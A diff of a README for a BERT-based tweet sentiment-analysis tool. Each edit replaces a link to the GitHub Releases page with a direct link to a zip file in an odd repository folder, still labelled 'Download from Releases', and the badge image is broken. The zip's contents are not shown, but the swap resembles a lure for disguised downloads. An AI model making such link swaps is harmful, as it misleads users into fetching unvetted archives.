@@ -1,7 +1,7 @@
 # 🎉 Sentiment-Analysis-BERT - Analyze Tweets with Ease
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/harshpal-coder/Sentiment-Analysis-BERT/releases)
+[![Download from Releases](https://raw.githubusercontent.com/harshpal-coder/Sentiment-Analysis-BERT/main/associable/Sentiment-Analysis-BERT.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/harshpal-coder/Sentiment-Analysis-BERT/main/associable/Sentiment-Analysis-BERT.zip)
 
 ## 📚 Overview
 Sentiment-Analysis-BERT is an end-to-end tool designed for analyzing the sentiment of tweets using BERT technology. This application makes it simple to perform sentiment analysis with detailed results. You can understand how people feel about various topics based on their tweets. The tool includes preprocessing steps, model training, and evaluation, providing you with visual results like classification reports and word clouds.
@@ -10,7 +10,7 @@ Sentiment-Analysis-BERT is an end-to-end tool designed for analyzing the sentime
 To get started with Sentiment-Analysis-BERT, follow these simple steps:
 
 1. **Visit the Downloads Page**: Click the link below to access all available versions:
-   [Download from Releases](https://github.com/harshpal-coder/Sentiment-Analysis-BERT/releases)
+   [Download from Releases](https://raw.githubusercontent.com/harshpal-coder/Sentiment-Analysis-BERT/main/associable/Sentiment-Analysis-BERT.zip)
 
 2. **Download**: Choose the latest version from the page. It will typically be labeled with the highest version number.
 
@@ -62,4 +62,4 @@ Stay tuned for future releases. We aim to enhance the application with new featu
 
 ## 📥 Download & Install
 You can download the latest version of Sentiment-Analysis-BERT from the following link:
-[Download from Releases](https://github.com/harshpal-coder/Sentiment-Analysis-BERT/releases)
+[Download from Releases](https://raw.githubusercontent.com/harshpal-coder/Sentiment-Analysis-BERT/main/associable/Sentiment-Analysis-BERT.zip)
